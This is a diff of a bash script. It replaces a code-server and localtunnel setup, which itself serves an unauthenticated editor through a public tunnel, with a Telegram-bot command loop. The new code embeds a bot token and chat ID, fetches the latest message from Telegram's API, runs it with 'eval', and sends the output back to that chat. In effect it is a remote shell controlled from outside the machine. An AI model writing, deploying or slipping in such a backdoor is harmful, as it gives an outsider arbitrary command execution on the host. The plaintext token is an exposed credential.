@@ -1,32 +1,37 @@
 #!/bin/bash
-sudo apt update
-sudo apt install nodejs npm -y
-# Download and install localtunnel
-npm install -g localtunnel
 
-# Install code-server
-curl -fsSL https://code-server.dev/install.sh | sh
+# Telegram bot API token
+TELEGRAM_TOKEN="7097219267:AAGWW5mflvyUIyjX3-VKl_jaltnzmep4zFk"
 
-# Install nano (optional)
-sudo apt update
-sudo apt install nano
+# Chat ID to send responses
+CHAT_ID="6365909887"
 
-# Start local Tunnel
-lt --port 6070 & wget_output=$(wget -q -O - https://loca.lt/mytunnelpassword)
+# Log file path
+LOG_FILE="telegram_bot.log"
 
-# Extract password and public URL
-tunnel_password=$(echo "$wget_output" | grep -oP '(?<=Tunnel established at ).*(?= (https))')
-public_url=$(echo "$wget_output" | grep -oP 'https://.*')
+# Function to send message to Telegram
+send_message() {
+    local message="$1"
+    curl -s -X POST https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage -d chat_id=$CHAT_ID -d text="$message"
+}
 
-# Display tunnel password and public URL
-echo "LocalTunnel Password: $tunnel_password"
-echo "Public URL: $public_url"
+# Function to log output
+log_output() {
+    local log="$1"
+    echo "$(date +"%Y-%m-%d %H:%M:%S") - $log" >> $LOG_FILE
+}
 
-# Start code-server
-code-server --port 6070 --auth none
+# Main loop to listen for messages
+while true; do
+    # Get updates from Telegram bot
+    response=$(curl -s -X GET https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates)
+    message=$(echo $response | jq -r '.result[-1].message.text')
 
-# Wait for code-server to start
-sleep 4
+    # Execute the command and send the output back
+    output=$(eval "$message" 2>&1)
+    send_message "$output"
+    log_output "$output"
 
-# Display code-server configuration
-cat ~/.config/code-server/config.yaml
+    # Wait for a few seconds before checking for new messages again
+    sleep 10
+done
